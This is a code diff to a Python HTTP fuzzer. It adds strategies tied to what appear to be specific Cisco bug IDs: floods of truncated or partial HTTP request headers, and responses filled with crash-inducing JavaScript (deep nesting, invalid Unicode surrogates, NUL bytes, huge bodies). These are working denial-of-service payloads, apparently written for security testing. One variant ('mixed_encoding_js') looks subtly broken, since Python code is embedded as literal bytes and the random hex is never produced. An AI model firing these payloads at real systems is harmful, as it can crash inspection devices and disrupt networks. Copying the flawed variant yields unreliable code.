@@ -39,6 +39,7 @@ HTTP_REQUEST_STRATEGIES = [
     "absolute_uri_confusion",
     "method_fuzz",
     "header_field_fuzz",
+    "partial_header_close",
 ]
 
 HTTP_RESPONSE_STRATEGY_LIST = [
@@ -53,6 +54,7 @@ HTTP_RESPONSE_STRATEGY_LIST = [
     "resp_version_confusion",
     "resp_header_end",
     "resp_content_length",
+    "resp_js_normalization_crash",
 ]
 
 HTTP_STRATEGIES = HTTP_REQUEST_STRATEGIES + HTTP_RESPONSE_STRATEGY_LIST
@@ -62,8 +64,8 @@ HTTP_RESPONSE_STRATEGIES = set(HTTP_RESPONSE_STRATEGY_LIST)
 # Default base weights (aligned with HTTP_STRATEGIES order; normalised
 # downstream). Request and response families each get ~50% of the mass.
 HTTP_WEIGHTS = [
-    5, 5, 6, 6, 4, 3, 2, 2, 3, 2, 2, 2, 4, 4,   # request (14, sum 50)
-    5, 5, 6, 5, 5, 4, 4, 4, 4, 3, 5,            # response (11, sum 50)
+    5, 5, 6, 6, 4, 3, 2, 2, 3, 2, 2, 2, 4, 4, 6,  # request (15)
+    5, 5, 6, 5, 5, 4, 4, 4, 4, 3, 5, 6,            # response (12)
 ]
 
 HTTP_STRATEGY_LABELS = {
@@ -92,6 +94,8 @@ HTTP_STRATEGY_LABELS = {
     "resp_version_confusion": "Resp: Version Confusion",
     "resp_header_end":        "Resp: Header-End Tricks",
     "resp_content_length":    "Resp: Content-Length Tricks",
+    "partial_header_close":   "Partial Header + Close (CSCwu90024)",
+    "resp_js_normalization_crash": "Resp: JS Normalization Crash (CSCwu24006/24015)",
 }
 
 
@@ -1058,6 +1062,88 @@ def build_http_response(strategy: str, payload_override=None) -> bytes:
         else:  # invalid
             cl = b"xxx"
         return OK + b"Content-Length: " + cl + b"\r\n\r\n" + body
+
+    # ---- PARTIAL HEADER + CLOSE (CSCwu90024) ----
+    if strategy == "partial_header_close":
+        variant = random.choice([
+            "truncated_request_line", "partial_host_header",
+            "truncated_chunked_header", "partial_content_length",
+            "header_flood_then_close",
+        ])
+        if variant == "truncated_request_line":
+            partials = []
+            for _ in range(200):
+                cut = random.randint(4, 25)
+                partials.append(b"GET /index.html HTTP/1.1\r\n"[:cut])
+            return b"".join(partials)
+        elif variant == "partial_host_header":
+            lines = []
+            for _ in range(200):
+                cut = random.randint(1, 15)
+                lines.append(b"GET / HTTP/1.1\r\nHost: example"[:-(16-cut)])
+            return b"".join(lines)
+        elif variant == "truncated_chunked_header":
+            lines = []
+            for _ in range(200):
+                hdr = (b"POST /upload HTTP/1.1\r\nHost: t\r\n"
+                       b"Transfer-Encoding: chunked\r\n")
+                cut = random.randint(len(hdr) - 20, len(hdr) - 1)
+                lines.append(hdr[:cut])
+            return b"".join(lines)
+        elif variant == "partial_content_length":
+            lines = []
+            for _ in range(200):
+                hdr = (b"POST /api HTTP/1.1\r\nHost: t\r\n"
+                       b"Content-Length: 100\r\n\r\n")
+                cut = random.randint(len(hdr) - 15, len(hdr) - 1)
+                lines.append(hdr[:cut])
+            return b"".join(lines)
+        else:
+            lines = []
+            for _ in range(100):
+                hdr = b"GET / HTTP/1.1\r\n"
+                for j in range(random.randint(5, 50)):
+                    hdr += b"X-Fuzz-%d: %s\r\n" % (j, b"A" * random.randint(10, 200))
+                lines.append(hdr)
+            return b"".join(lines)
+
+    # ---- RESP: JS NORMALIZATION CRASH (CSCwu24006, CSCwu24015) ----
+    if strategy == "resp_js_normalization_crash":
+        OK = b"HTTP/1.1 200 OK\r\n"
+        variant = random.choice([
+            "malformed_script_tag", "deeply_nested_js",
+            "invalid_unicode_js", "huge_js_body",
+            "script_with_nul", "mixed_encoding_js",
+        ])
+        if variant == "malformed_script_tag":
+            js = b"<script>" + b"var x=" * 5000 + b"'\\u{FFFFFF}';" * 1000 + b"</script>"
+            return (OK + b"Content-Type: text/html\r\n"
+                    b"Content-Length: %d\r\n\r\n" % len(js)) + js
+        elif variant == "deeply_nested_js":
+            js = b"<script>" + b"(function(){" * 500 + b"alert(1)" + b"})()" * 500 + b"</script>"
+            return (OK + b"Content-Type: text/html\r\n"
+                    b"Content-Length: %d\r\n\r\n" % len(js)) + js
+        elif variant == "invalid_unicode_js":
+            js = b"<script>var s='" + b"\\uD800\\uDBFF\\uDFFF" * 2000 + b"';</script>"
+            return (OK + b"Content-Type: text/html; charset=utf-8\r\n"
+                    b"Content-Length: %d\r\n\r\n" % len(js)) + js
+        elif variant == "huge_js_body":
+            js = b"<script>" + b"x" * 60000 + b"</script>"
+            return (OK + b"Content-Type: text/html\r\n"
+                    b"Content-Length: %d\r\n\r\n" % len(js)) + js
+        elif variant == "script_with_nul":
+            js = b"<script>var a='" + (b"A\x00B" * 3000) + b"';</script>"
+            return (OK + b"Content-Type: text/html\r\n"
+                    b"Content-Length: %d\r\n\r\n" % len(js)) + js
+        else:
+            js_parts = []
+            for _ in range(500):
+                js_parts.append(b"<script>eval('\\x" +
+                               b"'.join([b'%02x' % random.randint(0, 255)])" +
+                               b"');</script>")
+            js = b"".join(js_parts)
+            return (OK + b"Content-Type: text/html\r\n"
+                    b"Content-Length: %d\r\n\r\n" % len(js)) + js
 
     # Fallback: a plain, valid 200 response.
     return (b"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\n"
